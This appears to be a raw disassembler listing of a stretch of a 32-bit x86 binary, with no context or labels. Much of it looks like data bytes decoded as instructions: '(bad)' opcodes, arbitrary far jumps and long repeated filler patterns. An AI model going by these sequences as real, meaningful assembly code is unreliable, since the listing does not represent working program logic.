  44de82:	xor    al,0x3f
  44de84:	fsubp  st(1),st
  44de86:	ins    BYTE PTR es:[edi],dx
  44de87:	aas    
  44de88:	sahf   
  44de89:	jmp    0x3fc0:0xeb563f90
  44de90:	jmp    0xfb16:0xdffffea
  44de97:	(bad)  
  44de98:	in     eax,dx
  44de99:	add    eax,0xf6110000
  44de9e:	or     DWORD PTR [eax],esi
  44dea0:	cmc    
  44dea1:	lock inc esp
  44dea3:	xor    BYTE PTR [ebp-0xa],ah
  44dea6:	push   esi
  44dea7:	xor    BYTE PTR [ebx-0x7ecf9b0b],al
  44dead:	cmc    
  44deae:	jb     0x44dee0
  44deb0:	hlt    
  44deb1:	fisttp QWORD PTR [ebx+ecx*4]
  44deb4:	and    al,0xd6
  44deb6:	or     al,0xd2
  44deb8:	add    al,0xfb
  44deba:	or     al,0x1d
  44debc:	add    eax,0x5731390
  44dec1:	ficom  DWORD PTR [ebx]
  44dec3:	rol    DWORD PTR ds:0xe5fd0c4a,0x5
  44deca:	push   cs
  44decb:	xor    ah,dh
  44decd:	mov    ebx,0x70e6880d
  44ded2:	or     eax,0xd8ee6c2
  44ded7:	(bad)  
  44ded8:	(bad)  
  44ded9:	cmp    cl,BYTE PTR ds:0xf2ec708
  44dedf:	aas    
	...
  44def8:	add    bh,al
  44defa:	mov    ecx,0xdcc7760e
  44deff:	push   cs
  44df00:	mov    WORD PTR [edi],fs
  44df02:	xchg   BYTE PTR [esi],cl
  44df04:	mov    esp,0x30e9127
  44df09:	sub    BYTE PTR [esi],ch
  44df0b:	adc    BYTE PTR [edx+0x20],cl
  44df0e:	jecxz  0x44df27
  44df10:	fmul   QWORD PTR [eax]
  44df12:	push   eax
  44df13:	adc    DWORD PTR [ecx],esp
  44df15:	add    DWORD PTR [edx],ebx
  44df17:	adc    DWORD PTR [ebp+0x9],ebx
  44df1a:	dec    edx
  44df1b:	adc    DWORD PTR [eax],eax
  44df1d:	add    ah,BYTE PTR [edx+0x12]
  44df20:	adc    ch,dl
  44df22:	add    dl,BYTE PTR [edx]
  44df24:	cs loop 0x44df4a
  44df27:	adc    ch,BYTE PTR [esi-0x16]
  44df2a:	ficom  DWORD PTR [ecx]
  44df2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44df2d:	loop   0x44dee2
  44df2f:	adc    DWORD PTR [edx],edx
  44df31:	retf   
  44df32:	cmp    dl,BYTE PTR [ebx]
  44df34:	jo     0x44def9
  44df36:	fst    DWORD PTR [edx]
  44df38:	mov    dl,0xcb
  44df3a:	push   ss
  44df3b:	adc    edx,DWORD PTR [ecx]
  44df3d:	mov    esp,0x2c7e1441
  44df42:	add    eax,0xe5d1c36
  44df47:	inc    ecx
  44df48:	sbb    ebp,DWORD PTR [ecx+0x1f1b0e0e]
  44df4e:	or     edx,DWORD PTR [edx+0x1a]
  44df51:	xlat   BYTE PTR ds:[ebx]
  44df52:	or     edx,DWORD PTR [eax+0x19]
  44df55:	repnz or BYTE PTR [edi-0x4f6bbe1],ah
  44df5c:	pop    ds
	...
  44df75:	add    BYTE PTR [edi],dl
  44df77:	or     bl,BYTE PTR [ebx]
  44df79:	pop    ds
  44df7a:	add    BYTE PTR [edi],0x9c
  44df7d:	sbb    eax,0x1dd3076a
  44df82:	cmc    
  44df83:	pop    es
  44df84:	add    al,0x1d
  44df86:	aaa    
  44df87:	or     BYTE PTR [esi+0x1d],al
  44df8a:	and    BYTE PTR [eax],cl
  44df8c:	ins    DWORD PTR es:[edi],dx
  44df8d:	sbb    al,0x6c
  44df8f:	or     BYTE PTR [edi+0x1c],bh
  44df92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44df93:	or     BYTE PTR [esp+ebx*1+0x63e704f4],bl
  44df9a:	jno    0x44dfe4
  44df9c:	push   ss
  44df9d:	add    esi,esp
  44df9f:	add    al,0xf9
  44dfa1:	adc    esp,DWORD PTR [eax]
  44dfa3:	adc    eax,0x14c91431
  44dfa8:	unpcklps xmm4,XMMWORD PTR [ebx+0x15138215]
  44dfaf:	push   ss
  44dfb0:	mov    ah,0x12
  44dfb2:	int3   
  44dfb3:	adc    eax,0x164c1263
  44dfb8:	jbe    0x44dfcc
  44dfba:	sub    eax,0x9e11e916
  44dfbf:	adc    dl,cl
  44dfc1:	adc    DWORD PTR [edi+0x13],edx
  44dfc4:	loope  0x44dfd6
  44dfc6:	rcl    BYTE PTR [ebx],1
  44dfc8:	pop    ss
  44dfc9:	adc    ebx,ecx
  44dfcb:	adc    ebp,DWORD PTR [ecx-0x6dec47f0]
  44dfd1:	adc    BYTE PTR [edx-0x1ba6ffed],al
  44dfd7:	jae    0x44e005
  44dfd9:	dec    esp
	...
  44dff2:	add    BYTE PTR [edx+ebp*2],al
  44dff5:	sub    al,0x51
  44dff7:	add    al,0x9e
  44dff9:	sub    al,0x54
  44dffb:	add    al,0x8f
  44dffd:	sub    al,0x28
  44dfff:	add    al,0x46
  44e001:	sub    al,0x1d
  44e003:	in     al,0x39
  44e005:	sub    al,0x20
  44e007:	in     al,0x2a
  44e009:	sub    al,0x4
  44e00b:	in     al,0x61
  44e00d:	sub    al,0xf9
  44e00f:	jmp    0x44e066
  44e011:	sub    al,0xec
  44e013:	add    eax,DWORD PTR [esp+esi*1]
  44e016:	hlt    
  44e017:	sti    
  44e018:	repz xor ebx,DWORD PTR [esi]
  44e01b:	add    al,0xc6
  44e01d:	xor    esp,DWORD PTR ds:0x4033b604
  44e023:	in     al,0xc7
  44e025:	xor    ebx,DWORD PTR [esp+eiz*8-0x5e]
  44e029:	xor    edi,DWORD PTR [ebx-0x1c]
  44e02c:	lea    esi,[ebx]
  44e02e:	lods   al,BYTE PTR ds:[esi]
  44e02f:	in     al,0x3e
  44e031:	xor    ebx,DWORD PTR [eax-0xeccaefc]
  44e037:	add    al,0x26
  44e039:	xor    esp,ebx
  44e03b:	add    al,0xac
  44e03d:	xor    al,BYTE PTR [esi]
  44e03f:	add    eax,0xe57b3282
  44e044:	xchg   esp,eax
  44e045:	xor    al,BYTE PTR [ebp+eiz*8+0x33]
  44e049:	xor    ah,BYTE PTR [edx-0x7acdd61b]
  44e04f:	in     eax,0x1
  44e051:	xor    bl,cl
  44e053:	add    eax,0xc31eb
	...
  44e070:	push   es
  44e071:	and    dh,BYTE PTR [edx]
  44e073:	sbb    BYTE PTR [esi],al
  44e075:	push   ss
  44e076:	xor    dl,BYTE PTR [esi+eax*1]
  44e079:	mov    bl,0x31
  44e07b:	pop    edi
  44e07c:	out    0x86,al
  44e07e:	xor    DWORD PTR [eax],eax
  44e080:	ret    0xeaf2
  44e083:	ss sbb eax,0x5b3718f2
  44e089:	repnz pop ebx
  44e08b:	aaa    
  44e08c:	mov    edi,0x893765f3
  44e091:	repz test BYTE PTR [edi],dh
  44e094:	push   edi
  44e095:	repnz mov ecx,0xdcf1ed37
  44e09b:	aaa    
  44e09c:	shl    bl,cl
  44e09e:	repz aaa 
  44e0a0:	div    ecx
  44e0a2:	stc    
  44e0a3:	aaa    
  44e0a4:	(bad)  
  44e0a5:	jmp    0x381c:0xeaa33810
  44e0ac:	push   0xffffffea
  44e0ae:	xor    al,0x38
  44e0b0:	jmp    0x60e9:0x2e3854e8
  44e0b7:	cmp    BYTE PTR [eax],bl
  44e0b9:	jmp    0x38ae:0xea793891
  44e0c0:	jno    0x44e0ac
  44e0c2:	sar    BYTE PTR [eax],cl
  44e0c4:	lods   eax,DWORD PTR ds:[esi]
  44e0c5:	jmp    0x3971:0xe7e638dc
  44e0cc:	fucomp st(0)
  44e0ce:	mov    edi,DWORD PTR [ecx]
  44e0d0:	ja     0x44e0bb
  44e0d2:	iret   
  44e0d3:	cmp    DWORD PTR [eax],eax
	...
  44e0ed:	xor    eax,0x5639fce9
  44e0f2:	call   0xe8d61b08
  44e0f7:	cmp    DWORD PTR [edx],edi
  44e0f9:	dec    ebp
  44e0fa:	call   0xe80c1b73
  44e0ff:	(bad)  
  44e100:	cmp    bl,BYTE PTR [ebx-0x14c55019]
  44e106:	out    0xc8,eax
  44e108:	cmp    ch,bl
  44e10a:	out    0xeb,eax
  44e10c:	cmp    bh,BYTE PTR [edi+eiz*8+0x2f43b0d]
  44e113:	sbb    DWORD PTR [edi],ebp
  44e115:	iret   
  44e116:	xchg   esp,eax
  44e117:	sbb    DWORD PTR [eax-0x31],esi
  44e11a:	loope  0x44e135
  44e11c:	or     eax,0xd01114c0
  44e121:	mov    eax,0x30dc10e5
  44e126:	pop    edx
  44e127:	pop    ss
  44e128:	bound  ebp,QWORD PTR [ecx]
  44e12a:	dec    eax
  44e12b:	push   ss
  44e12c:	inc    edi
  44e12d:	and    cl,BYTE PTR [esi-0x21e583ea]
  44e133:	push   ss
  44e134:	xchg   edi,eax
  44e135:	adc    cl,BYTE PTR [ecx]
  44e137:	pop    ss
  44e138:	mov    bh,0xa
  44e13a:	sbb    al,0x17
  44e13c:	int3   
  44e13d:	add    ah,BYTE PTR [ebx]
  44e13f:	pop    ss
  44e140:	out    dx,al
  44e141:	cli    
  44e142:	and    eax,0x8ff31f15
  44e147:	adc    eax,0x16abeb3a
  44e14c:	jge    0x44e131
  44e14e:	test   BYTE PTR [esi],dl
  44e150:	mov    eax,0x0
	...
  44e169:	add    bl,bl
  44e16b:	cwde   
  44e16c:	push   ss
  44e16d:	aad    0xd3
  44e16f:	pop    ebx
  44e170:	dec    esp
  44e171:	std    
  44e172:	mov    esi,DWORD PTR [edi+0x28f40003]
  44e178:	or     al,0x5e
  44e17a:	(bad)  
  44e17b:	(bad)  
  44e17c:	adc    ebp,DWORD PTR [edi]
  44e17e:	and    eax,0x25410d4f
  44e183:	adc    DWORD PTR ds:0xcae2570,ecx
  44e189:	shl    DWORD PTR ds:0x6030c79,cl
  44e18f:	dec    edx
  44e190:	adc    ah,BYTE PTR [esi+0x6]
  44e193:	dec    eax
  44e194:	adc    dl,BYTE PTR [esi+eax*1+0x6ca11a8]
  44e19b:	adc    WORD PTR [eax],ax
  44e19e:	out    0x94,eax
  44e1a0:	adc    edi,DWORD PTR [ecx]
  44e1a2:	out    0x4,eax
  44e1a4:	mov    edi,0xc9118c14
  44e1a9:	adc    al,0x78
  44e1ab:	adc    DWORD PTR [ecx],edi
  44e1ad:	adc    eax,0x15401132
  44e1b2:	fst    QWORD PTR [eax]
  44e1b4:	cld    
  44e1b5:	cmpxchg BYTE PTR [eax],dl
  44e1b8:	(bad)  
  44e1b9:	jge    0x9b5532cf
  44e1bf:	stc    
  44e1c0:	ins    BYTE PTR es:[edi],dx
  44e1c1:	adc    BYTE PTR [ecx-0x6],al
  44e1c4:	pop    edx
  44e1c5:	adc    bl,BYTE PTR [eax-0x33e2ca02]
  44e1cb:	add    BYTE PTR [ebx*1+0x0],bl
	...
  44e1e6:	add    BYTE PTR [edx-0x56e7d0ff],bl
  44e1ec:	add    al,0xe7
  44e1ee:	add    eax,ecx
  44e1f0:	inc    esp
  44e1f1:	rol    BYTE PTR [ebx],cl
  44e1f3:	hlt    
  44e1f4:	add    al,0xf3
  44e1f6:	adc    esi,DWORD PTR [ebx]
  44e1f8:	test   BYTE PTR [ecx+0x16],0xe0
  44e1fc:	add    eax,DWORD PTR [ebx+0x19]
  44e1ff:	hlt    
  44e200:	add    al,0xe7
  44e202:	repz cwde 
  44e204:	inc    esp
  44e205:	sub    al,BYTE PTR [esp+esi*8]
  44e208:	add    al,0x6e
  44e20a:	adc    al,0x10
  44e20c:	stc    
  44e20d:	mov    ch,0xf
  44e20f:	cli    
  44e210:	stc    
  44e211:	cli    
  44e212:	push   cs
  44e213:	or     eax,0xee122ffb
  44e218:	cli    
  44e219:	ja     0x44e22c
  44e21b:	out    0xfb,al
  44e21d:	push   0xc1fc4210
  44e222:	sbb    ecx,DWORD PTR [ebx]
  44e224:	std    
  44e225:	sbb    DWORD PTR [ebx+edx*8],ebx
  44e228:	cld    
  44e229:	fwait
  44e22a:	sbb    esp,DWORD PTR [ecx]
  44e22c:	std    
  44e22d:	push   ss
  44e22e:	sbb    ebp,DWORD PTR [ecx+0x691a6efd]
  44e234:	(bad)  
  44e235:	jmp    DWORD PTR [eax-0x68c9b1f2]
  44e23b:	push   cs
  44e23c:	pusha  
  44e23d:	ss dec ebp
  44e23f:	(bad)  
  44e240:	sub    DWORD PTR [esi],esi
  44e242:	pop    ebx
  44e243:	(bad)  
  44e244:	xor    DWORD PTR [eax],edi
  44e246:	jmp    0xa3d2422
	...
  44e263:	add    al,dh
  44e265:	add    al,0x0
  44e267:	in     eax,0xe7
  44e269:	jmp    0x71254c9d
  44e26e:	sub    al,0x72
  44e270:	or     BYTE PTR [edx],ah
  44e272:	cmp    al,bh
  44e274:	(bad)  
  44e276:	ss jno 0x44e27a
  44e279:	xor    esi,DWORD PTR ds:0x4f8de
  44e27f:	jmp    0x8e3d246b
  44e284:	test   DWORD PTR [eax+eax*1],0x2f81e780
  44e28b:	scas   eax,DWORD PTR es:[edi]
  44e28c:	loope  0x44e213
  44e28e:	sub    eax,0x36e7047f
  44e293:	mov    esp,0x534c208
  44e298:	std    
  44e299:	in     al,0x3a
  44e29b:	add    eax,0x53aecfd
  44e2a0:	in     eax,dx
  44e2a1:	hlt    
  44e2a2:	cmp    dl,BYTE PTR ds:0x53afced
  44e2a8:	ffree  st(4)
  44e2aa:	cmp    ah,BYTE PTR ds:0x253accdd
  44e2b0:	or     eax,0xd153ad5
  44e2b5:	fnstsw WORD PTR [edx]
  44e2b7:	inc    ebp
  44e2b8:	std    
  44e2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e2ba:	cmp    al,BYTE PTR ds:0x53aacfd
  44e2c0:	in     eax,dx
  44e2c1:	mov    ah,0x3a
  44e2c3:	adc    eax,0x3abced
	...
  44e2e0:	add    cl,bh
  44e2e2:	sbb    eax,0x1dd13d80
  44e2e7:	mov    BYTE PTR ds:0x3d901d99,bh
  44e2ed:	rcr    DWORD PTR ds:0x1d793d98,0xa0
  44e2f4:	cmp    eax,0x3f0e1d71
  44e2f9:	push   esi
  44e2fa:	sbb    cl,BYTE PTR [edx+0x3f]
  44e2fd:	pop    ebx
  44e2fe:	sbb    ah,BYTE PTR [edx+0x3f]
  44e301:	cmp    ebx,DWORD PTR [edx]
  44e303:	nop
  44e304:	aas    
  44e305:	cdq    
  44e306:	sbb    esp,DWORD PTR [ecx-0x2fe5ebc1]
  44e30c:	aas    
  44e30d:	stc    
  44e30e:	sbb    eax,ebp
  44e310:	aas    
  44e311:	sbb    DWORD PTR [edx],ebx
  44e313:	add    BYTE PTR [eax],al
  44e315:	int    0x46
  44e317:	sti    
  44e318:	jmp    DWORD PTR [ecx-0x54fffffa]
  44e31e:	push   ss
  44e31f:	adc    dh,BYTE PTR [eax]
  44e321:	mov    dl,0x16
  44e323:	cmp    DWORD PTR [eax],esi
  44e325:	mov    edx,DWORD PTR [esi]
  44e327:	push   edx
  44e328:	xor    BYTE PTR [ebx+0x49307216],al
  44e32e:	sbb    DWORD PTR [eax-0x42e98fd0],ebx
  44e334:	xor    BYTE PTR [edi+0x16],bl
  44e337:	(bad)  
  44e338:	xor    BYTE PTR [edi-0x72cf09ea],dh
  44e33e:	sbb    DWORD PTR [ecx+esi*1],ebx
  44e341:	in     al,0x17
  44e343:	dec    ebx
  44e344:	xor    DWORD PTR [eax],eax
	...
  44e35e:	xor    BYTE PTR [eax],bl
  44e360:	imul   esi,DWORD PTR [ecx],0x31991828
  44e366:	call   FWORD PTR [ebx]
  44e368:	mov    BYTE PTR ds:0x3fc71b3e,bh
  44e36e:	ins    DWORD PTR es:[edi],dx
  44e36f:	sbb    eax,DWORD PTR [eax]
  44e371:	add    ah,dh
  44e373:	sub    ebp,DWORD PTR [esp+edi*8-0x3b7b5]
  44e37a:	hlt    
  44e37b:	adc    DWORD PTR [esp+esi*2],edx
  44e37e:	add    al,0x5c
  44e380:	adc    ebx,DWORD PTR [esi]
  44e382:	in     eax,0x1e
  44e384:	or     ah,BYTE PTR [ebx-0x1e]
  44e387:	cmp    cl,BYTE PTR [edx]
  44e389:	xchg   edx,ebp
  44e38b:	pop    ebx
  44e38c:	sbb    esi,DWORD PTR [ebx-0x23]
  44e38f:	jg     0x44e3a2
  44e391:	mov    bh,0xd3
  44e393:	lock adc DWORD PTR [eax],eax
  44e396:	hlt    
  44e397:	sub    ebx,esp
  44e399:	cld    
  44e39a:	add    ebp,DWORD PTR [esp+edi*8-0x1]
  44e39e:	hlt    
  44e39f:	inc    esi
  44e3a0:	push   cs
  44e3a1:	int    0x26
  44e3a3:	cwde   
  44e3a4:	or     eax,0x100f2780
  44e3a9:	cmp    DWORD PTR [eax],ebp
  44e3ab:	jnp    0x44e3b5
  44e3ad:	push   0x20
  44e3af:	loopne 0x44e3b9
  44e3b1:	mov    cl,BYTE PTR [edx]
  44e3b3:	ror    DWORD PTR [edx],0x99
  44e3b6:	add    al,BYTE PTR [eax]
  44e3b8:	or     edx,DWORD PTR [edi]
  44e3ba:	std    
  44e3bb:	loop   0x44e3d8
  44e3bd:	popf   
  44e3be:	std    
  44e3bf:	in     eax,dx
  44e3c0:	sbb    ebp,DWORD PTR [ebx+0x0]
	...
  44e3da:	add    dh,ch
  44e3dc:	sbb    dl,BYTE PTR [edi]
  44e3de:	daa    
  44e3df:	jmp    0xe283fb5c
  44e3e4:	ret    
  44e3e5:	adc    ah,BYTE PTR [eax-0x25]
  44e3e8:	mov    ds:0x55d3f412,eax
  44e3ed:	adc    al,BYTE PTR [eax]
  44e3ef:	hlt    
  44e3f0:	sub    ecx,esp
  44e3f2:	cld    
  44e3f3:	or     DWORD PTR [ebx-0x460bfffd],0x13
  44e3fa:	mov    esp,0xc8136e24
  44e3ff:	and    al,0xa2
  44e401:	adc    edx,esp
  44e403:	and    al,0x5
  44e405:	mov    esi,0x8ff43a14
  44e40a:	adc    al,0x44
  44e40c:	hlt    
  44e40d:	cdq    
  44e40e:	adc    al,0x4e
  44e410:	hlt    
  44e411:	jecxz  0x44e425
  44e413:	out    dx,eax
  44e414:	repz fist DWORD PTR [edx]
  44e417:	fcomip st,st(3)
  44e419:	iret   
  44e41a:	adc    ah,dl
  44e41c:	repz mov ecx,0x21f3ef12
  44e422:	adc    eax,esp
  44e424:	repz mov ebp,0xc8f39312
  44e42a:	adc    cl,BYTE PTR [eax+0x7612d1f3]
  44e430:	repz std 
  44e432:	adc    eax,ecx
  44e434:	test   BYTE PTR [ecx+0x12],0x7
  44e438:	mul    BYTE PTR [ebx+0x11]
  44e43b:	xchg   edx,eax
  44e43c:	hlt    
  44e43d:	inc    ecx
  44e43e:	adc    DWORD PTR [eax],eax
	...
  44e458:	loopne 0x44e44e
  44e45a:	loop   0x44e46b
  44e45c:	imul   edi,ecx,0x28
  44e45f:	adc    al,dl
  44e461:	stc    
  44e462:	push   cs
  44e463:	adc    al,cl
  44e465:	stc    
  44e466:	push   cs
  44e467:	adc    al,dh
  44e469:	stc    
  44e46a:	fimul  WORD PTR [esi]
  44e46c:	call   0x1053c36a
  44e471:	cli    
  44e472:	into   
  44e473:	push   cs
  44e474:	call   0x30539372
  44e479:	cli    
  44e47a:	sahf   
  44e47b:	push   cs
  44e47c:	dec    eax
  44e47d:	cli    
  44e47e:	ds movups xmm7,xmm2
  44e482:	dec    esi
  44e483:	invd   
  44e485:	cli    
  44e486:	dec    esi
  44e487:	pshufw mm7,mm2,0x5e
  44e48b:	push   cs
  44e48c:	push   0x500e5efa
  44e491:	cli    
  44e492:	mov    cs,WORD PTR [esi]
  44e494:	test   al,0xfa
  44e496:	push   DWORD PTR [eax-0x6]
  44e499:	dec    eax
  44e49a:	xor    ah,BYTE PTR [ecx-0x3ecda70e]
  44e4a0:	jmp    0x3239:0x2913228
  44e4a7:	xchg   ecx,eax
  44e4a8:	cli    
  44e4a9:	add    al,0x0
  44e4ab:	jmp    0xa63d2567
  44e4b0:	test   DWORD PTR [eax+eax*1],0x300907e9
  44e4b7:	fld    QWORD PTR [edi]
  44e4b9:	sbb    eax,0xbd30
	...
  44e4d2:	add    BYTE PTR [eax],al
  44e4d4:	add    BYTE PTR [edi],al
  44e4d6:	aad    0x2c
  44e4d8:	mov    ebp,0xbd2cdd04
  44e4dd:	in     al,0xa4
  44e4df:	sub    al,0xcd
  44e4e1:	in     al,0xac
  44e4e3:	sub    al,0xbd
  44e4e5:	in     al,0xb4
  44e4e7:	sub    al,0xbd
  44e4e9:	in     al,0xbc
  44e4eb:	sub    al,0xbd
  44e4ed:	add    al,0x99
  44e4ef:	sub    al,0x8d
  44e4f1:	add    al,0x79
  44e4f3:	sub    al,0x25
  44e4f5:	add    al,0x59
  44e4f7:	sub    al,0xd
  44e4f9:	add    al,0x39
  44e4fb:	sub    al,0xe5
  44e4fd:	add    ebx,DWORD PTR [ecx]
  44e4ff:	xor    al,0xcd
  44e501:	sti    
  44e502:	clc    
  44e503:	xor    esp,DWORD PTR [ebp-0x72cc270d]
  44e509:	jmp    0x44e4c3
  44e50b:	xor    esp,DWORD PTR [ebp+0x3]
  44e50e:	cdq    
  44e50f:	xor    ecx,DWORD PTR [ebp-0x5]
  44e512:	js     0x44e547
  44e514:	and    eax,0xcd3358f3
  44e519:	cld    
  44e51a:	cmp    BYTE PTR [ebx],dh
  44e51c:	in     eax,0xec
  44e51e:	sbb    BYTE PTR [ebx],dh
  44e520:	or     eax,0x2532f8ed
  44e525:	fstp   st(0)
  44e527:	xor    al,BYTE PTR [eax]
  44e529:	sub    DWORD PTR [esi],ebx
  44e52b:	je     0x44e562
  44e52d:	fstp   DWORD PTR ds:0x1d793594
  44e533:	mov    ah,0x35
  44e535:	cdq    
  44e536:	sbb    eax,0x35d4
	...
  44e54f:	add    BYTE PTR [eax],al
  44e551:	add    BYTE PTR [ecx+0x1d],ch
  44e554:	hlt    
  44e555:	xor    eax,0x36141d59
  44e55a:	cmp    DWORD PTR ds:0x1b193634,ebx
  44e560:	push   esp
  44e561:	ss jmp 0x997b5981
  44e567:	sbb    dl,BYTE PTR [esi+esi*1+0x36b41ab9]
  44e56e:	pop    ecx
  44e56f:	sbb    dl,ah
  44e571:	ss test eax,0x1936f41a
  44e577:	sbb    dl,BYTE PTR [edi+esi*1]
  44e57a:	stc    
  44e57b:	sbb    esi,DWORD PTR [edi+esi*1]
  44e57e:	pop    ecx
  44e57f:	sbb    dl,BYTE PTR [eax+0x37]
  44e582:	pop    ecx
  44e583:	sbb    bl,BYTE PTR [eax+0x37]
  44e586:	xchg   ecx,eax
  44e587:	sbb    esp,DWORD PTR [eax+0x37]
  44e58a:	mov    ecx,0xa137681b
  44e58f:	sbb    esi,DWORD PTR [eax+0x37]
  44e592:	jns    0x44e5af
  44e594:	js     0x44e5cd
  44e596:	jno    0x44e5b3
  44e598:	xor    BYTE PTR [edi],0x59
  44e59b:	sbb    cl,BYTE PTR [eax-0x6fe5dec9]
  44e5a1:	aaa    
  44e5a2:	sbb    DWORD PTR [edx],ebx
  44e5a4:	cwde   
  44e5a5:	aaa    
  44e5a6:	push   ecx
  44e5a7:	sbb    ah,BYTE PTR [eax-0x57e5c6c9]
  44e5ad:	aaa    
  44e5ae:	loope  0x44e5c9
  44e5b0:	mov    al,0x37
  44e5b2:	jns    0x44e5cf
  44e5b4:	mov    eax,0x37
	...
  44e5cd:	add    BYTE PTR [eax],al
  44e5cf:	jno    0x44e5ec
  44e5d1:	enter  0xf437,0x2b
  44e5d5:	cld    
  44e5d6:	push   esp
  44e5d8:	sub    edi,esp
  44e5da:	push   esp
  44e5dc:	sub    edi,esp
  44e5de:	push   esp
  44e5e0:	sub    edi,esp
  44e5e2:	push   esp
  44e5e4:	sub    edi,esp
  44e5e6:	push   esp
  44e5e8:	sub    edi,esp
  44e5ea:	push   esp
  44e5ec:	sub    edi,esp
  44e5ee:	push   esp
  44e5f0:	sub    edi,esp
  44e5f2:	push   esp
  44e5f4:	sub    edi,esp
  44e5f6:	push   esp
  44e5f8:	sub    edi,esp
  44e5fa:	push   esp
  44e5fc:	sub    edi,esp
  44e5fe:	push   esp
  44e600:	sub    edi,esp
  44e602:	push   esp
  44e604:	sub    edi,esp
  44e606:	push   esp
  44e608:	sub    edi,esp
  44e60a:	push   esp
  44e60c:	sub    edi,esp
  44e60e:	push   esp
  44e610:	sub    edi,esp
  44e612:	push   esp
  44e614:	sub    edi,esp
  44e616:	push   esp
  44e618:	sub    edi,esp
  44e61a:	push   esp
  44e61c:	sub    edi,esp
  44e61e:	push   esp
  44e620:	sub    edi,esp
  44e622:	push   esp
  44e624:	sub    edi,esp
  44e626:	push   esp
  44e628:	sub    edi,esp
  44e62a:	push   esp
  44e62c:	sub    edi,esp
  44e62e:	push   esp
  44e630:	sub    edi,esp
  44e632:	inc    DWORD PTR [eax]
	...
  44e64c:	hlt    
  44e64d:	sub    edi,esp
  44e64f:	push   esp
  44e651:	sub    edi,esp
  44e653:	push   esp
  44e655:	sub    edi,esp
  44e657:	push   esp
  44e659:	sub    edi,esp
  44e65b:	push   esp
  44e65d:	sub    edi,esp
  44e65f:	push   esp
  44e661:	sub    edi,esp
  44e663:	push   esp
  44e665:	add    al,0xe7
  44e667:	add    esi,esp
  44e669:	add    al,0xe7
  44e66b:	add    esi,esp
  44e66d:	add    al,0xe7
  44e66f:	add    esi,esp
  44e671:	add    al,0xe7
  44e673:	add    esi,esp
  44e675:	add    al,0xe7
  44e677:	add    esi,esp
  44e679:	add    al,0xe7
  44e67b:	add    esi,esp
  44e67d:	add    al,0xe7
  44e67f:	add    esi,esp
  44e681:	add    al,0xe7
  44e683:	add    esi,esp
  44e685:	add    al,0xe7
  44e687:	add    esi,esp
  44e689:	add    al,0xe7
  44e68b:	add    esi,esp
  44e68d:	add    al,0xe7
  44e68f:	add    esi,esp
  44e691:	add    al,0xe7
  44e693:	add    esi,esp
  44e695:	add    al,0xe7
  44e697:	add    esi,esp
  44e699:	add    al,0xe7
  44e69b:	add    esi,esp
  44e69d:	add    al,0xe7
  44e69f:	add    esi,esp
  44e6a1:	add    al,0xe7
  44e6a3:	add    esi,esp
  44e6a5:	add    al,0xe7
  44e6a7:	add    esi,esp
  44e6a9:	add    al,0xe7
  44e6ab:	add    esi,esp
  44e6ad:	add    al,0xe7
  44e6af:	add    eax,DWORD PTR [eax]
	...
  44e6c9:	hlt    
  44e6ca:	add    al,0xe7
  44e6cc:	add    esi,esp
  44e6ce:	add    al,0xe7
  44e6d0:	add    esi,esp
  44e6d2:	add    al,0xe7
  44e6d4:	add    esi,esp
  44e6d6:	add    al,0xe7
  44e6d8:	add    esi,esp
  44e6da:	add    al,0xe7
  44e6dc:	add    esi,esp
  44e6de:	add    al,0xe7
  44e6e0:	add    esi,esp
  44e6e2:	add    al,0xe7
  44e6e4:	add    esi,esp
  44e6e6:	add    al,0xe7
  44e6e8:	add    esi,esp
  44e6ea:	add    al,0xe7
  44e6ec:	add    esi,esp
  44e6ee:	add    al,0xe7
  44e6f0:	add    esi,esp
  44e6f2:	add    al,0xe7
  44e6f4:	add    esi,esp
  44e6f6:	add    al,0x0
  44e6f8:	jmp    0xe944ebf4
  44e6fd:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e704:	jmp    0xe944ec00
  44e709:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e710:	jmp    0xe944ec0c
  44e715:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e71c:	jmp    0xe944ec18
  44e721:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e728:	jmp    0xe944ec24
	...
  44e745:	add    bh,dh
  44e747:	add    al,0x0
  44e749:	jmp    0xe944ec45
  44e74e:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e755:	jmp    0xe944ec51
  44e75a:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e761:	jmp    0xe944ec5d
  44e766:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e76d:	jmp    0xe944ec69
  44e772:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e779:	jmp    0xe944ec75
  44e77e:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e785:	jmp    0x44ec81
  44e78a:	popf   
  44e78b:	pop    es
  44e78c:	add    BYTE PTR [eax],al
  44e78e:	popf   
  44e78f:	pop    es
  44e790:	add    BYTE PTR [eax],al
  44e792:	lea    eax,[edi]
  44e794:	add    BYTE PTR [eax],al
  44e796:	lea    eax,[edi]
  44e798:	add    BYTE PTR [eax],al
  44e79a:	popf   
  44e79b:	pop    es
  44e79c:	add    BYTE PTR [eax],al
  44e79e:	popf   
  44e79f:	pop    es
  44e7a0:	add    BYTE PTR [eax],al
  44e7a2:	lea    eax,[edi]
  44e7a4:	add    BYTE PTR [eax],al
  44e7a6:	lea    eax,[edi]
	...
  44e7c0:	add    BYTE PTR [eax],al
  44e7c2:	add    BYTE PTR [ebp+0x7],bl
  44e7c5:	add    BYTE PTR [eax],al
  44e7c7:	pop    ebp
  44e7c8:	pop    es
  44e7c9:	add    BYTE PTR [eax],al
  44e7cb:	dec    ebp
  44e7cc:	pop    es
  44e7cd:	add    BYTE PTR [eax],al
  44e7cf:	dec    ebp
  44e7d0:	pop    es
  44e7d1:	add    BYTE PTR [eax],al
  44e7d3:	pop    ebp
  44e7d4:	pop    es
  44e7d5:	add    BYTE PTR [eax],al
  44e7d7:	pop    ebp
  44e7d8:	pop    es
  44e7d9:	add    BYTE PTR [eax],al
  44e7db:	dec    ebp
  44e7dc:	pop    es
  44e7dd:	add    BYTE PTR [eax],al
  44e7df:	dec    ebp
  44e7e0:	pop    es
  44e7e1:	add    BYTE PTR [eax],al
  44e7e3:	sbb    eax,0x1d000007
  44e7e8:	pop    es
  44e7e9:	add    BYTE PTR [eax],al
  44e7eb:	or     eax,0xd000007
  44e7f0:	pop    es
